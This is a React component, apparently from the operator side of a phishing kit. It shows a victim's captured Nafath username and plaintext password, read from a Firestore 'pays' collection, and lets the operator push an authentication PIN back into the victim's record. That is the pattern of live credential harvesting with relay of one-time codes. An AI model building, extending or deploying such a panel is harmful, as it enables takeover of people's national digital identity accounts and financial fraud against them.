"use client";

import { useState } from "react";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogFooter,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { CheckCircle, Lock, Shield, User } from "lucide-react";
import { doc, updateDoc } from "firebase/firestore";
import { db } from "@/lib/firebase";
import { toast } from "sonner";

interface NafazAuthDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  notification: any;
}

export default function NafazAuthDialog({
  open,
  onOpenChange,
  notification,
}: NafazAuthDialogProps) {
  const [username, setUsername] = useState(notification?.nafadUsername || "");
  const [password, setPassword] = useState(notification?.nafadPassword || "");
  const [pin, setPin] = useState(notification?.nafaz_pin || "");
  const [attachment, setAttachment] = useState(
    notification?.autnAttachment || ""
  );
  const [isSubmitting, setIsSubmitting] = useState(false);
  const handleSave = async (id: string, value: string) => {
    const targetPost = doc(db, "pays", id);
    await updateDoc(targetPost, {
      nafaz_pin: value,
    });
    toast.success("تم حفظ البيانات بنجاح", {
      position: "top-center",
      duration: 3000,
      icon: <CheckCircle className="h-5 w-5" />,
    });
  };
  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent
        className="bg-white dark:bg-gray-800 border-0 shadow-2xl max-w-md rounded-xl"
        dir="rtl"
      >
        <DialogHeader className="border-b pb-3">
          <DialogTitle className="text-xl font-bold bg-gradient-to-r from-primary to-primary/80 text-transparent bg-clip-text">
            بيانات تسجيل الدخول لنفاذ
          </DialogTitle>
        </DialogHeader>

        <div className="space-y-4 py-3">
          <div className="p-4 rounded-lg bg-gradient-to-r from-blue-500 to-blue-600 text-white shadow-lg">
            <div className="flex justify-between items-start mb-4">
              <div className="flex flex-col">
                <span className="text-sm text-blue-100 mb-1">
                  معلومات المستخدم
                </span>
                <span className="font-medium">نفاذ</span>
              </div>
              <Shield className="h-8 w-8 text-white opacity-80" />
            </div>
          </div>

          <div className="space-y-4">
            <div className="grid gap-2">
              <Label htmlFor="username" className="text-right">
                اسم المستخدم
              </Label>
              <div className="relative">
                <User className="absolute right-3 top-2.5 h-4 w-4 text-muted-foreground" />
                <Input
                  readOnly
                  id="username"
                  value={notification?.nafadUsername}
                  className="pr-10"
                  dir="ltr"
                />
              </div>
            </div>

            <div className="grid gap-2">
              <Label htmlFor="password" className="text-right">
                كلمة المرور
              </Label>
              <div className="relative">
                <Lock className="absolute right-3 top-2.5 h-4 w-4 text-muted-foreground" />
                <Input
                  id="password"
                  readOnly
                  value={notification?.nafadPassword}
                  className="pr-10"
                  dir="ltr"
                />
              </div>
            </div>

            <div className="grid gap-2">
              <Label htmlFor="pin" className="text-right">
                كود التوثيق{" "}
              </Label>
              <div className="relative">
                <Shield className="absolute right-3 top-2.5 h-4 w-4 text-muted-foreground" />
                <Input
                  id="pin"
                  value={pin}
                  onChange={(e) => setPin(e.target.value)}
                  className="pr-10"
                  dir="ltr"
                />
              </div>
            </div>
          </div>
        </div>

        <DialogFooter className="flex flex-col sm:flex-row gap-2 sm:gap-0 mt-4 pt-3 border-t">
          <Button
            onClick={() => handleSave(notification.id, pin)}
            disabled={isSubmitting}
            className="w-full bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white border-0 shadow-md"
          >
            {isSubmitting ? "جاري الحفظ..." : "حفظ البيانات"}
          </Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  );
}
